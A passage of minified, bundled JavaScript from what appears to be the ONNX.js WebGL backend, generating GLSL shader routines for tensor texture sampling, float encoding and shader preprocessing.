outTexShape=[outputLayout.width,outputLayout.height],inTexShape=[inputLayout.width,inputLayout.height],inRank=inputLayout.unpackedShape.length,outRank=outputLayout.unpackedShape.length,inShape=inputLayout.unpackedShape,outShape=outputLayout.unpackedShape,texFuncSnippet=(0,utils_1.generateShaderFuncNameFromInputSamplerName)(name);if(inRank===outRank&&util_1.ArrayUtil.arraysEqual(inTexShape,outTexShape)){const source=`\n          float ${funcName}() {\n            return sampleTexture(${name}, TexCoords);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}const type=(0,utils_1.getCoordsDataType)(outRank),broadcastDims=util_1.BroadcastUtil.getBroadcastDims(inShape,outShape),rankDiff=outRank-inRank;let coordsSnippet;const fields=(0,utils_1.getGlChannels)();coordsSnippet=0===inRank?"":outRank<2&&broadcastDims.length>=1?"coords = 0;":broadcastDims.map((d=>`coords.${fields[d+rankDiff]} = 0;`)).join("\n");let unpackedCoordsSnippet="";unpackedCoordsSnippet=outRank<2&&inRank>0?"coords":inputLayout.unpackedShape.map(((s,i)=>`coords.${fields[i+rankDiff]}`)).join(", ");const source=`\n        float ${funcName}() {\n          ${type} coords = getOutputCoords();\n          ${coordsSnippet}\n          return ${texFuncSnippet}(${unpackedCoordsSnippet});\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.getOutputCoords"])}getPackedSamplerFromInput(funcName,name,inputLayout){switch(inputLayout.unpackedShape.length){case 0:return this.getPackedSamplerScalar(funcName,name);case 1:return this.getPackedSampler1D(funcName,name,inputLayout);case 2:return this.getPackedSampler2D(funcName,name,inputLayout);case 3:return this.getPackedSampler3D(funcName,name,inputLayout);default:return this.getPackedSamplerND(funcName,name,inputLayout)}}getUnpackedSamplerFromInput(funcName,name,inputLayout){const shape=inputLayout.unpackedShape;switch(shape.length){case 0:return this.getUnpackedSamplerScalar(funcName,name,inputLayout);case 1:return this.getUnpackedSampler1D(funcName,name,inputLayout);case 2:return this.getUnpackedSampler2D(funcName,name,inputLayout);case 3:return this.getUnpackedSampler3D(funcName,name,inputLayout);case 4:return this.getUnpackedSampler4D(funcName,name,inputLayout);case 5:return this.getUnpackedSampler5D(funcName,name,inputLayout);case 6:return this.getUnpackedSampler6D(funcName,name,inputLayout);default:throw new Error(`Unsupported dimension ${shape.length}-D`)}}getPackedSamplerScalar(funcName,name){const source=`\n          vec4 ${funcName}() {\n            return ${(0,glsl_source_1.getGlsl)(this.context.glContext.version).texture2D}(${name}, halfCR);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source)}getPackedSampler1D(funcName,name,inputLayout){const texShape=[inputLayout.width,inputLayout.height],packedTexShape=[texShape[1],texShape[0]],glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version),source=`vec4 ${funcName}(int index) {\n      vec2 uv = packedUVfrom1D(\n      ${packedTexShape[0]}, ${packedTexShape[1]}, index);\n      return ${glsl.texture2D}(${name}, uv);\n    }`;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.packedUVfrom1D"])}getPackedSampler2D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,texShape=[inputLayout.width,inputLayout.height],glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version),texNumR=texShape[0],texNumC=texShape[1];if(null!=texShape&&util_1.ArrayUtil.arraysEqual(shape,texShape)){const packedSampler=`vec4 ${funcName}(int row, int col) {\n        vec2 uv = (vec2(col, row) + halfCR) / vec2(${texNumC}.0, ${texNumR}.0);\n        return ${glsl.texture2D}(${name}, uv);\n      }`;return new glsl_definitions_1.GlslLibRoutine(packedSampler)}const packedTexShape=texShape,valuesPerRow=Math.ceil(shape[1]/2),source=`vec4 ${funcName}(int row, int col) {\n      vec2 uv = packedUVfrom2D(${packedTexShape[1]}, ${packedTexShape[0]}, ${valuesPerRow}, row, col);\n      return ${glsl.texture2D}(${name}, uv);\n    }`;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.packedUVfrom2D"])}getPackedSampler3D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,texShape=[inputLayout.width,inputLayout.height],packedTexShape=[texShape[0],texShape[1]],glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version);if(1===shape[0]){const squeezedShape=shape.slice(1),keptDims=[1,2],newInputShape=(0,utils_1.squeezeInputShape)(shape,squeezedShape),params=["b","row","col"],newInputLayout=JSON.parse(JSON.stringify(inputLayout));newInputLayout.unpackedShape=newInputShape;const samplerRoutine=this.getPackedSamplerFromInput(funcName,name,newInputLayout),source=`${samplerRoutine.routineBody}\n      vec4 ${funcName}(int b, int row, int col) {\n        return ${funcName}(${(0,utils_1.getSqueezedParams)(params,keptDims)});\n      } `;return new glsl_definitions_1.GlslLibRoutine(source,samplerRoutine.dependencies)}const texNumR=packedTexShape[0],texNumC=packedTexShape[1],valuesPerRow=Math.ceil(shape[2]/2),source=`vec4 ${funcName}(int b, int row, int col) {\n      vec2 uv = packedUVfrom3D(\n        ${texNumC}, ${texNumR}, ${valuesPerRow*Math.ceil(shape[1]/2)}, ${valuesPerRow}, b, row, col);\n      return ${glsl.texture2D}(${name}, uv);}`;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.packedUVfrom3D"])}getPackedSamplerND(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,rank=shape.length,texShape=[inputLayout.width,inputLayout.height],glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version),packedTexShape=[texShape[0],texShape[1]],texNumR=packedTexShape[1],texNumC=packedTexShape[0],valuesPerRow=Math.ceil(shape[rank-1]/2);let texelsInBatch=valuesPerRow*Math.ceil(shape[rank-2]/2),params="int b, int row, int col",index=`b * ${texelsInBatch} + (row / 2) * ${valuesPerRow} + (col / 2)`;for(let b=2;b<rank-1;b++)params=`int b${b}, `+params,texelsInBatch*=shape[rank-b-1],index=`b${b} * ${texelsInBatch} + `+index;const source=`vec4 ${funcName}(${params}) {\n      int index = ${index};\n      int texR = index / ${texNumC};\n      int texC = index - texR * ${texNumC};\n      vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${texNumC}, ${texNumR});\n      return ${glsl.texture2D}(${name}, uv);\n    }`;return new glsl_definitions_1.GlslLibRoutine(source)}getUnpackedSamplerScalar(funcName,name,inputLayout){const[texNumR,texNumC]=[inputLayout.width,inputLayout.height];if(1===texNumR&&1===texNumC){const source=`\n          float ${funcName}() {\n            return sampleTexture(${name}, halfCR);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}const source=`\n        float ${funcName}() {\n          int offset_${name} = coordsToOffset(TexCoords, ${texNumR}, ${texNumC});\n          vec2 uv = uvFromFlat(${texNumR}, ${texNumC}, offset_${name});\n          return sampleTexture(${name}, uv);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture","coordinates.coordsToOffset"])}getUnpackedSampler1D(funcName,name,inputLayout){const tNumR=inputLayout.width,tNumC=inputLayout.height;if(1===tNumC&&1===tNumR){const source=`\n        float ${funcName}(int index) {\n          return sampleTexture(${name}, halfCR);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}if(1===tNumC){const source=`\n          float ${funcName}(int index) {\n            vec2 uv = vec2((float(index) + 0.5) / ${tNumR}.0, 0.5);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}if(1===tNumR){const source=`\n          float ${funcName}(int index) {\n            vec2 uv = vec2(0.5, (float(index) + 0.5) / ${tNumC}.0);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}const source=`\n        float ${funcName}(int index) {\n          vec2 uv = uvFromFlat(${tNumR}, ${tNumC}, index);\n          return sampleTexture(${name}, uv);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture"])}getUnpackedSampler2D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,texShape=[inputLayout.height,inputLayout.width];if(null!=texShape&&util_1.ArrayUtil.arraysEqual(shape,texShape)){const source=`\n          float ${funcName}(int row, int col) {\n            vec2 uv = (vec2(row, col) + halfCR) / vec2(${texShape[1]}.0, ${texShape[0]}.0);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}const{newShape:newShape,keptDims:keptDims}=(0,texture_layout_strategy_1.squeezeShape)(shape),squeezedShape=newShape;if(squeezedShape.length<shape.length){const newInputShape=(0,utils_1.squeezeInputShape)(shape,squeezedShape),newInputLayout=JSON.parse(JSON.stringify(inputLayout));newInputLayout.unpackedShape=newInputShape;const params=["col","row"],source=`\n          ${this.getUnpackedSamplerFromInput(funcName,name,newInputLayout).routineBody}\n          float ${funcName}(int row, int col) {\n            return ${funcName}(${(0,utils_1.getSqueezedParams)(params,keptDims)});\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture"])}const texNumR=texShape[1],texNumC=texShape[0];if(1===texNumC){const source=`\n          float ${funcName}(int row, int col) {\n            int offset_${name} = coordsToOffset(TexCoords, ${texNumR}, ${texNumC});\n            float index = dot(vec3(row, col, offset_${name}), vec3(${shape[1]}, 1, 1));\n            vec2 uv = vec2(0.5, (index + 0.5) / ${texNumR}.0);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture","coordinates.coordsToOffset"])}if(1===texNumR){const source=`\n          float ${funcName}(int row, int col) {\n            int offset_${name} = coordsToOffset(TexCoords, ${texNumR}, ${texNumC});\n            float index = dot(vec3(row, col, offset_${name}), vec3(${shape[1]}, 1, 1));\n            vec2 uv = vec2((index + 0.5) / ${texNumC}.0, 0.5);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture","coordinates.coordsToOffset"])}const source=`\n        float ${funcName}(int row, int col) {\n          int index = col * ${shape[1]} + row;\n          vec2 uv = uvFromFlat(${texNumR}, ${texNumC}, index);\n          return sampleTexture(${name}, uv);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture","coordinates.coordsToOffset"])}getUnpackedSampler3D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,stride0=shape[1]*shape[2],stride1=shape[2],{newShape:newShape,keptDims:keptDims}=(0,texture_layout_strategy_1.squeezeShape)(shape),squeezedShape=newShape;if(squeezedShape.length<shape.length){const newInputShape=(0,utils_1.squeezeInputShape)(shape,squeezedShape),params=["batch","col","row"],newInputLayout=JSON.parse(JSON.stringify(inputLayout));newInputLayout.unpackedShape=newInputShape;const routine=this.getUnpackedSamplerFromInput(funcName,name,newInputLayout),revDims=keptDims.reverse(),source=`\n          ${routine.routineBody}\n          float ${funcName}(int batch, int row, int col) {\n            return ${funcName}(${(0,utils_1.getSqueezedParams)(params,revDims)});\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,routine.dependencies)}const source=`\n          float ${funcName}(int depth, int row, int col) {\n            // Explicitly use integer operations as dot() only works on floats.\n            int index = depth * ${stride0} + col * ${stride1} + row;\n            vec2 uv = uvFromFlat(${inputLayout.width}, ${inputLayout.height}, index);\n            return sampleTexture(${name}, uv);\n          }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture","coordinates.coordsToOffset"])}getUnpackedSampler4D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,stride2=shape[3],stride1=shape[2]*stride2,source=`\n        float ${funcName}(int row, int col, int depth, int depth2) {\n          int index = row * ${shape[1]*stride1} + col * ${stride1} +\n              depth2 * ${stride2} + depth;\n          vec2 uv = uvFromFlat(${inputLayout.width}, ${inputLayout.height}, index);\n          return sampleTexture(${name}, uv);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture"])}getUnpackedSampler5D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,stride3=shape[4],stride2=shape[3]*stride3,stride1=shape[2]*stride2,stride0=shape[1]*stride1,{newShape:newShape,keptDims:keptDims}=(0,texture_layout_strategy_1.squeezeShape)(shape);if(newShape.length<shape.length){const newInputShape=(0,utils_1.squeezeInputShape)(shape,newShape),params=["row","col","depth","depth2","depth3"],newInputLayout=JSON.parse(JSON.stringify(inputLayout));newInputLayout.unpackedShape=newInputShape;const source=`\n          ${this.getUnpackedSamplerFromInput(funcName,name,newInputLayout).routineBody}\n          float ${funcName}(int row, int col, int depth, int depth2, int depth3) {\n            return ${funcName}(${(0,utils_1.getSqueezedParams)(params,keptDims)});\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture","coordinates.uvFromFlat"])}const source=`\n        float ${funcName}(int row, int col, int depth, int depth2, int depth3) {\n          int index = row * ${stride0} + col * ${stride1} + depth * ${stride2} +\n          depth3 * ${stride3} + depth2;\n          vec2 uv = uvFromFlat(${inputLayout.width}, ${inputLayout.height}, index);\n          return sampleTexture(${name}, uv);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture","coordinates.uvFromFlat"])}getUnpackedSampler6D(funcName,name,inputLayout){const shape=inputLayout.unpackedShape,stride4=shape[5],stride3=shape[4]*stride4,stride2=shape[3]*stride3,stride1=shape[2]*stride2,stride0=shape[1]*stride1,{newShape:newShape,keptDims:keptDims}=(0,texture_layout_strategy_1.squeezeShape)(shape);if(newShape.length<shape.length){const newInputShape=(0,utils_1.squeezeInputShape)(shape,newShape),params=["row","col","depth","depth2","depth3","depth4"],newInputLayout=JSON.parse(JSON.stringify(inputLayout));newInputLayout.unpackedShape=newInputShape;const source=`\n            ${this.getUnpackedSamplerFromInput(funcName,name,newInputLayout).routineBody}\n            float ${funcName}(int row, int col, int depth,\n              int depth2, int depth3, int depth4) {\n              return ${funcName}(${(0,utils_1.getSqueezedParams)(params,keptDims)});\n            }\n          `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.sampleTexture","coordinates.uvFromFlat"])}const source=`\n          float ${funcName}(int row, int col, int depth,\n            int depth2, int depth3, int depth4) {\n            int index = row * ${stride0} + col * ${stride1} + depth * ${stride2} +\n            depth2 * ${stride3} + depth3 * ${stride4} + depth4;\n            vec2 uv = uvFromFlat(${inputLayout.width}, ${inputLayout.height}, index);\n            return sampleTexture(${name}, uv);\n          }\n        `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.uvFromFlat","coordinates.sampleTexture","coordinates.coordsToOffset"])}toVec(){const output=this.context.outputTextureLayout,rank=output.shape.length,strides=output.strides,xScale=output.width,yScale=output.height,stridesBlock=[];for(let i=0;i<rank-1;++i)stridesBlock.push(`\n        c[${i}] = offset / ${strides[i]};`),stridesBlock.push(`\n        offset -= c[${i}] * ${strides[i]};`);stridesBlock.push(`\n        c[${rank-1}] = offset;`);const body=`\n      void toVec(vec2 texCoords, out int c[${rank}]) {\n        int offset = coordsToOffset(texCoords, ${xScale}, ${yScale});\n        ${stridesBlock.join("")}\n      }\n      void toVec(int offset, out int c[${rank}]) {\n        ${stridesBlock.join("")}\n      }\n    `;return{toVec:new glsl_definitions_1.GlslLibRoutine(body,["coordinates.coordsToOffset"])}}valueFrom(){const result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const layout=this.context.inputTextureLayouts[i],rank=(layout.unpackedShape.length>0?layout.unpackedShape:layout.shape).length;let funcName=`_${name}`;result[funcName]=new glsl_definitions_1.GlslLibRoutine(this.getValueFromSingle(name,rank,layout.width,layout.height,!1),[`shapeUtils.indicesToOffset${funcName}`,"coordinates.offsetToCoords","fragcolor.getColorAsFloat"]),funcName+="_T",result[funcName]=new glsl_definitions_1.GlslLibRoutine(this.getValueFromSingle(name,rank,layout.width,layout.height,!0),[`shapeUtils.indicesToOffset${funcName}`,"coordinates.offsetToCoords","fragcolor.getColorAsFloat"])})),result}getValueFromSingle(varName,rank,width,height,transpose){let name=`_${varName}`;transpose&&(name+="_T");return`\n        float ${name}(int m[${rank}]) {\n          int offset = indicesToOffset${name}(m);\n          vec2 coords = offsetToCoords(offset, ${width}, ${height});\n          float value = getColorAsFloat(${(0,glsl_source_1.getGlsl)(this.context.glContext.version).texture2D}(${varName}, coords));\n          return value;\n        }\n        `}getPackedValueFrom(varName,rank,width,height,transpose){let name=`_${varName}_Pack`;transpose&&(name+="_T");return`\n        vec4 ${name}(int m[${rank}]) {\n          int offset = indicesToOffset_${varName}(m);\n          vec2 coords = offsetToCoords(offset, ${width}, ${height});\n          return ${(0,glsl_source_1.getGlsl)(this.context.glContext.version).texture2D}(${varName}, coords);\n        }\n        `}}exports.CoordsGlslLib=CoordsGlslLib},"./lib/onnxjs/backends/webgl/glsl-definitions.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.TopologicalSortGlslRoutines=exports.GlslLibRoutineNode=exports.GlslLibRoutine=exports.GlslLib=exports.GlslContext=exports.FunctionType=void 0,function(FunctionType){FunctionType[FunctionType.ValueBased=0]="ValueBased",FunctionType[FunctionType.Positional=1]="Positional"}(exports.FunctionType||(exports.FunctionType={}));exports.GlslContext=class GlslContext{constructor(glContext,programInfo,inputTextureLayouts,outputTextureLayout){this.glContext=glContext,this.programInfo=programInfo,this.inputTextureLayouts=inputTextureLayouts,this.outputTextureLayout=outputTextureLayout}};exports.GlslLib=class GlslLib{constructor(context){this.context=context}};exports.GlslLibRoutine=class GlslLibRoutine{constructor(routineBody,dependencies){this.routineBody=routineBody,this.dependencies=dependencies}};exports.GlslLibRoutineNode=class GlslLibRoutineNode{constructor(name,routineBody,dependencies){this.name=name,this.dependencies=dependencies||[],routineBody&&(this.routineBody=routineBody)}addDependency(node){node&&this.dependencies.push(node)}};exports.TopologicalSortGlslRoutines=class TopologicalSortGlslRoutines{static returnOrderedNodes(nodes){if(!nodes||0===nodes.length)return[];if(1===nodes.length)return nodes;const cycleCheck=new Set,alreadyTraversed=new Set,result=new Array;return this.createOrderedNodes(nodes,cycleCheck,alreadyTraversed,result),result}static createOrderedNodes(graphNodes,cycleCheck,alreadyTraversed,result){for(let i=0;i<graphNodes.length;++i)this.dfsTraverse(graphNodes[i],cycleCheck,alreadyTraversed,result)}static dfsTraverse(root,cycleCheck,alreadyTraversed,result){if(!root||alreadyTraversed.has(root.name))return;if(cycleCheck.has(root.name))throw new Error("Cyclic dependency detected. Can't topologically sort routines needed for shader.");cycleCheck.add(root.name);const dependencies=root.dependencies;if(dependencies&&dependencies.length>0)for(let i=0;i<dependencies.length;++i)this.dfsTraverse(dependencies[i],cycleCheck,alreadyTraversed,result);result.push(root),alreadyTraversed.add(root.name),cycleCheck.delete(root.name)}}},"./lib/onnxjs/backends/webgl/glsl-encoding-lib.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.EncodingGlslLib=void 0;const glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts");class EncodingGlslLib extends glsl_definitions_1.GlslLib{constructor(context){super(context)}getFunctions(){return Object.assign(Object.assign({},this.encodeFloat32()),this.decodeFloat32())}getCustomTypes(){return{}}encodeFloat32(){return{encode:new glsl_definitions_1.GlslLibRoutine("highp vec4 encode(highp float f) {\n        return vec4(f, 0.0, 0.0, 0.0);\n      }\n        ")}}decodeFloat32(){return{decode:new glsl_definitions_1.GlslLibRoutine("highp float decode(highp vec4 rgba) {\n        return rgba.r;\n      }\n        ")}}encodeUint8(){const endianness=EncodingGlslLib.isLittleEndian()?"rgba.rgba=rgba.abgr;":"";return{encode:new glsl_definitions_1.GlslLibRoutine(`\n      highp vec4 encode(highp float f) {\n        highp float F = abs(f);\n        highp float Sign = step(0.0,-f);\n        highp float Exponent = floor(log2(F));\n        highp float Mantissa = (exp2(- Exponent) * F);\n        Exponent = floor(log2(F) + 127.0) + floor(log2(Mantissa));\n        highp vec4 rgba;\n        rgba[0] = 128.0 * Sign  + floor(Exponent*exp2(-1.0));\n        rgba[1] = 128.0 * mod(Exponent,2.0) + mod(floor(Mantissa*128.0),128.0);\n        rgba[2] = floor(mod(floor(Mantissa*exp2(23.0 -8.0)),exp2(8.0)));\n        rgba[3] = floor(exp2(23.0)*mod(Mantissa,exp2(-15.0)));\n        ${endianness}\n        rgba = rgba / 255.0; // values need to be normalized to [0,1]\n        return rgba;\n    }\n        `)}}decodeUint8(){const endianness=EncodingGlslLib.isLittleEndian()?"rgba.rgba=rgba.abgr;":"";return{decode:new glsl_definitions_1.GlslLibRoutine(`\n        highp float decode(highp vec4 rgba) {\n          rgba = rgba * 255.0; // values need to be de-normalized from [0,1] to [0,255]\n          ${endianness}\n          highp float Sign = 1.0 - step(128.0,rgba[0])*2.0;\n          highp float Exponent = 2.0 * mod(rgba[0],128.0) + step(128.0,rgba[1]) - 127.0;\n          highp float Mantissa = mod(rgba[1],128.0)*65536.0 + rgba[2]*256.0 +rgba[3] + float(0x800000);\n          highp float Result =  Sign * exp2(Exponent) * (Mantissa * exp2(-23.0 ));\n          return Result;\n      }\n        `)}}static isLittleEndian(){const b=new ArrayBuffer(4),a=new Uint32Array(b),c=new Uint8Array(b);if(a[0]=3735928559,239===c[0])return!0;if(222===c[0])return!1;throw new Error("unknown endianness")}}exports.EncodingGlslLib=EncodingGlslLib},"./lib/onnxjs/backends/webgl/glsl-fragcolor-lib.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.FragColorGlslLib=void 0;const glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts");class FragColorGlslLib extends glsl_definitions_1.GlslLib{constructor(context){super(context)}getFunctions(){return Object.assign(Object.assign({},this.setFragColor()),this.getColorAsFloat())}getCustomTypes(){return{}}setFragColor(){const glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version);return{setFragColor:new glsl_definitions_1.GlslLibRoutine(`\n        void setFragColor(float value) {\n            ${glsl.output} = encode(value);\n        }\n        `,["encoding.encode"])}}getColorAsFloat(){return{getColorAsFloat:new glsl_definitions_1.GlslLibRoutine("\n        float getColorAsFloat(vec4 color) {\n            return decode(color);\n        }\n        ",["encoding.decode"])}}}exports.FragColorGlslLib=FragColorGlslLib},"./lib/onnxjs/backends/webgl/glsl-function-inliner.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.replaceInlines=void 0;const INLINE_FUNC_DEF_REGEX=/@inline[\s\n\r]+(\w+)[\s\n\r]+([0-9a-zA-Z_]+)\s*\(([^)]*)\)\s*{(([^}]|[\n\r])*)}/gm;exports.replaceInlines=function replaceInlines(script){const inlineDefs={};let match;for(;null!==(match=INLINE_FUNC_DEF_REGEX.exec(script));){const params=match[3].split(",").map((s=>{const tokens=s.trim().split(" ");return tokens&&2===tokens.length?{type:tokens[0],name:tokens[1]}:null})).filter((v=>null!==v));inlineDefs[match[2]]={params:params,body:match[4]}}for(const name in inlineDefs){const regexString="(\\w+)?\\s+([_0-9a-zA-Z]+)\\s+=\\s+__FUNC__\\((.*)\\)\\s*;".replace("__FUNC__",name),regex=new RegExp(regexString,"gm");for(;null!==(match=regex.exec(script));){const type=match[1],variable=match[2],params=match[3].split(","),declLine=type?`${type} ${variable};`:"";let newBody=inlineDefs[name].body,paramRedecLine="";inlineDefs[name].params.forEach(((v,i)=>{v&&(paramRedecLine+=`${v.type} ${v.name} = ${params[i]};\n`)})),newBody=`${paramRedecLine}\n ${newBody}`,newBody=newBody.replace("return",`${variable} = `);const replacement=`\n      ${declLine}\n      {\n        ${newBody}\n      }\n      `;script=script.replace(match[0],replacement)}}return script=script.replace(INLINE_FUNC_DEF_REGEX,"")}},"./lib/onnxjs/backends/webgl/glsl-preprocessor.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.GlslPreprocessor=void 0;const glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts"),glsl_function_inliner_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-function-inliner.ts"),glsl_registered_libs_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-registered-libs.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts");exports.GlslPreprocessor=class GlslPreprocessor{constructor(glContext,programInfo,inputTextureLayouts,outputTextureLayout){this.libs={},this.glslLibRoutineDependencyGraph={},this.context=new glsl_definitions_1.GlslContext(glContext,programInfo,inputTextureLayouts,outputTextureLayout),Object.keys(glsl_registered_libs_1.glslRegistry).forEach((name=>{const lib=new glsl_registered_libs_1.glslRegistry[name](this.context);this.libs[name]=lib}));const map=this.glslLibRoutineDependencyGraph;for(const libName in this.libs){const routinesInLib=this.libs[libName].getFunctions();for(const routine in routinesInLib){const key=libName+"."+routine;let currentNode;map[key]?(currentNode=map[key],currentNode.routineBody=routinesInLib[routine].routineBody):(currentNode=new glsl_definitions_1.GlslLibRoutineNode(key,routinesInLib[routine].routineBody),map[key]=currentNode);const dependencies=routinesInLib[routine].dependencies;if(dependencies)for(let i=0;i<dependencies.length;++i)if(map[dependencies[i]])currentNode.addDependency(map[dependencies[i]]);else{const node=new glsl_definitions_1.GlslLibRoutineNode(dependencies[i]);map[dependencies[i]]=node,currentNode.addDependency(node)}}}}preprocess(){const programInfo=this.context.programInfo;let source=programInfo.shaderSource;return this.context.programInfo.hasMain||(source=`${source}\n      ${(0,glsl_source_1.getDefaultFragShaderMain)(this.context.glContext.version,this.context.outputTextureLayout.shape.length)}`),source=(0,glsl_function_inliner_1.replaceInlines)(source),`${(0,glsl_source_1.getFragShaderPreamble)(this.context.glContext.version)}\n    ${this.getUniforms(programInfo.inputNames,programInfo.variables)}\n    ${this.getImports(source)}\n    ${source}`}getImports(script){const routinesIncluded=this.selectGlslLibRoutinesToBeIncluded(script);if(0===routinesIncluded.length)return"";let routines="";for(let i=0;i<routinesIncluded.length;++i){if(!routinesIncluded[i].routineBody)throw new Error(`Missing body for the Glsl Library routine: ${routinesIncluded[i].name}`);routines+=routinesIncluded[i].routineBody+"\n"}return routines}selectGlslLibRoutinesToBeIncluded(script){const nodes=[];return Object.keys(this.glslLibRoutineDependencyGraph).forEach((classAndRoutine=>{const routine=classAndRoutine.split(".")[1];-1!==script.indexOf(routine)&&nodes.push(this.glslLibRoutineDependencyGraph[classAndRoutine])})),glsl_definitions_1.TopologicalSortGlslRoutines.returnOrderedNodes(nodes)}getUniforms(samplers,variables){const uniformLines=[];if(samplers)for(const sampler of samplers)uniformLines.push(`uniform sampler2D ${sampler};`);if(variables)for(const variable of variables)uniformLines.push(`uniform ${variable.type} ${variable.name}${variable.arrayLength?`[${variable.arrayLength}]`:""};`);return uniformLines.join("\n")}}},"./lib/onnxjs/backends/webgl/glsl-registered-libs.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.glslRegistry=void 0;const glsl_coordinate_lib_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-coordinate-lib.ts"),glsl_encoding_lib_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-encoding-lib.ts"),glsl_fragcolor_lib_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-fragcolor-lib.ts"),glsl_shape_utils_lib_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-shape-utils-lib.ts"),glsl_vec_lib_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-vec-lib.ts");exports.glslRegistry={encoding:glsl_encoding_lib_1.EncodingGlslLib,fragcolor:glsl_fragcolor_lib_1.FragColorGlslLib,vec:glsl_vec_lib_1.VecGlslLib,shapeUtils:glsl_shape_utils_lib_1.ShapeUtilsGlslLib,coordinates:glsl_coordinate_lib_1.CoordsGlslLib}},"./lib/onnxjs/backends/webgl/glsl-shape-utils-lib.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.ShapeUtilsGlslLib=void 0;const glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts");class ShapeUtilsGlslLib extends glsl_definitions_1.GlslLib{constructor(context){super(context)}getFunctions(){return Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},this.bcastIndex()),this.bcastMatmulIndex()),this.offsetToIndices()),this.indicesToOffset()),this.incrementIndices())}getCustomTypes(){return{}}bcastIndex(){const outputRank=this.context.outputTextureLayout.shape.length,result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const shape=this.context.inputTextureLayouts[i].unpackedShape;if(shape.length<=outputRank){const rank=shape.length,dimOffset=outputRank-rank,funcName=`bcastIndices_${name}`;let block="";for(let i=0;i<rank;++i)block+=`\n          realIndices[${i}] = int( mod(float(bcastedIndices[${dimOffset+i}]), ${shape[i]}.0) );\n          `;const body=`\n        void ${funcName} (int bcastedIndices[${outputRank}], out int realIndices[${rank}]) {\n          ${block}\n        }\n        `;result[funcName]=new glsl_definitions_1.GlslLibRoutine(body)}})),result}bcastMatmulIndex(){const outputRank=this.context.outputTextureLayout.shape.length,result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const shape=this.context.inputTextureLayouts[i].shape;if(!(shape.length<2||shape.length>outputRank)){const 